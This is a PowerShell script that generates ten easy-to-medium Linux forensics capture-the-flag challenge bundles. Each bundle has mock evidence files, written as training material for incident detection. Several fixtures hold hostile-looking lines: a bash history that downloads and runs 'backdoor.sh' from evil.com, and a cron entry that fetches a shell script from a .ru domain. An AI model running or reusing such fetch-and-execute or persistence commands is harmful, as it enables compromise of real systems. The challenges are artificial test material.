param(
    [string[]]$BundleName = @()
)

$ErrorActionPreference = "Stop"

$artifactRoot = Join-Path $PSScriptRoot "..\\artifacts\\m5"
$artifactRoot = [System.IO.Path]::GetFullPath($artifactRoot)
$buildRoot = Join-Path $env:TEMP "m5_artifacts_build"

function Write-TextFile {
    param(
        [string]$Path,
        [string]$Content
    )

    $parent = Split-Path -Parent $Path
    if ($parent) {
        New-Item -ItemType Directory -Force -Path $parent | Out-Null
    }

    [System.IO.File]::WriteAllText(
        $Path,
        $Content.Replace("`n", [Environment]::NewLine),
        [System.Text.Encoding]::UTF8
    )
}

function New-BundleDirectory {
    param([string]$Name)

    $bundlePath = Join-Path $buildRoot $Name
    New-Item -ItemType Directory -Force -Path $bundlePath | Out-Null
    New-Item -ItemType Directory -Force -Path (Join-Path $bundlePath "evidence") | Out-Null
    return $bundlePath
}

function Publish-Bundle {
    param([string]$Bundle)

    $source = Join-Path $buildRoot $Bundle
    $zipPath = Join-Path $artifactRoot ($Bundle + ".zip")
    if (Test-Path $zipPath) {
        Remove-Item -Force $zipPath
    }
    Compress-Archive -Path (Join-Path $source "*") -DestinationPath $zipPath -Force
}

function Build-CaseBundle {
    param([hashtable]$Case)

    $bundle = $Case["bundle"]
    if ($BundleName.Count -gt 0 -and -not ($BundleName -contains $bundle)) {
        return
    }

    $bundlePath = New-BundleDirectory -Name $bundle

    $description = @"
$($Case["title"])
Difficulty: $($Case["difficulty"])

Scenario:
$($Case["scenario"])

Task:
$($Case["task"])

Flag format:
CTF{answer}
"@

    Write-TextFile -Path (Join-Path $bundlePath "description.txt") -Content $description
    Write-TextFile -Path (Join-Path $bundlePath "evidence\\$($Case["evidence_name"])") -Content $Case["evidence_content"]
    Publish-Bundle -Bundle $bundle
}

$cases = @(
    @{
        bundle = "m5-01-suspicious-user"
        title = "M5-01 - Suspicious User"
        difficulty = "Easy"
        scenario = "A Linux server audit revealed a new account created outside change control."
        task = "Identify the suspicious user."
        evidence_name = "passwd.txt"
        evidence_content = @"
root:x:0:0:root:/root:/bin/bash
ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
backup:x:1001:1001:Backup:/home/backup:/bin/bash
hacker:x:1002:1002:Unknown:/home/hacker:/bin/bash
"@
    },
    @{
        bundle = "m5-02-ssh-login-trail"
        title = "M5-02 - SSH Login Trail"
        difficulty = "Easy"
        scenario = "Authentication records include successful root logins from internal and external IP addresses."
        task = "Identify the external attacker IP."
        evidence_name = "auth.log"
        evidence_content = @"
Jun 14 02:11 ssh login success user=root ip=192.168.1.10
Jun 14 02:13 ssh login success user=root ip=203.0.113.7
"@
    },
    @{
        bundle = "m5-03-bash-history-review"
        title = "M5-03 - Bash History Review"
        difficulty = "Easy"
        scenario = "An incident responder exported command history from a potentially compromised shell."
        task = "Identify the command used to download the malicious script."
        evidence_name = "bash_history"
        evidence_content = @"
ls
cd /var/www
wget http://evil.com/backdoor.sh
chmod +x backdoor.sh
./backdoor.sh
"@
    },
    @{
        bundle = "m5-04-cron-persistence"
        title = "M5-04 - Cron Persistence"
        difficulty = "Easy"
        scenario = "Crontab entries were reviewed for persistence mechanisms."
        task = "Identify the suspicious domain in cron."
        evidence_name = "crontab.txt"
        evidence_content = @"
*/5 * * * * /usr/bin/backup.sh
*/10 * * * * curl http://malicious-site.ru/shell.sh
"@
    },
    @{
        bundle = "m5-05-suid-binary"
        title = "M5-05 - SUID Binary"
        difficulty = "Easy"
        scenario = "Privilege escalation review identified executable files with the SUID bit."
        task = "Identify the risky SUID binary commonly abused by attackers."
        evidence_name = "permissions.txt"
        evidence_content = @"
-rwsr-xr-x root root /usr/bin/passwd
-rwsr-xr-x root root /usr/bin/find
"@
    },
    @{
        bundle = "m5-06-hidden-file"
        title = "M5-06 - Hidden File"
        difficulty = "Medium"
        scenario = "A home directory listing was captured from a suspicious Linux account."
        task = "Identify the suspicious hidden file."
        evidence_name = "home_listing.txt"
        evidence_content = @"
.
..
.bashrc
.config
.hidden_backdoor
notes.txt
"@
    },
    @{
        bundle = "m5-07-strange-process"
        title = "M5-07 - Strange Process"
        difficulty = "Medium"
        scenario = "Process list output was gathered after unexplained CPU spikes."
        task = "Identify the suspicious process."
        evidence_name = "ps_output.txt"
        evidence_content = @"
PID CMD
1221 sshd
1402 nginx
1500 cryptominer
"@
    },
    @{
        bundle = "m5-08-suspicious-download"
        title = "M5-08 - Suspicious Download"
        difficulty = "Medium"
        scenario = "Security monitoring recorded a script download from an untrusted domain."
        task = "Identify the malicious domain."
        evidence_name = "wget.log"
        evidence_content = @"
wget http://bad-domain.ru/payload.sh
"@
    },
    @{
        bundle = "m5-09-log-tampering"
        title = "M5-09 - Log Tampering"
        difficulty = "Medium"
        scenario = "Syslog records suggest manipulation to hide unauthorized logins."
        task = "Identify the indicator of log tampering."
        evidence_name = "syslog.txt"
        evidence_content = @"
Jun 14 02:11 login root success
Jun 14 02:12 login root success
Jun 14 02:13 log truncated
"@
    },
    @{
        bundle = "m5-10-unauthorized-ssh-key"
        title = "M5-10 - Unauthorized SSH Key"
        difficulty = "Medium"
        scenario = "An account's SSH authorized keys file was reviewed during incident response."
        task = "Identify the unauthorized key owner."
        evidence_name = "authorized_keys"
        evidence_content = @"
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC user@company
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQD attacker@evil
"@
    }
)

if (Test-Path $buildRoot) {
    Remove-Item -Recurse -Force $buildRoot
}
New-Item -ItemType Directory -Force -Path $buildRoot | Out-Null
New-Item -ItemType Directory -Force -Path $artifactRoot | Out-Null

foreach ($case in $cases) {
    Build-CaseBundle -Case $case
}

Write-Host "M5 artifact bundles generated in $artifactRoot"
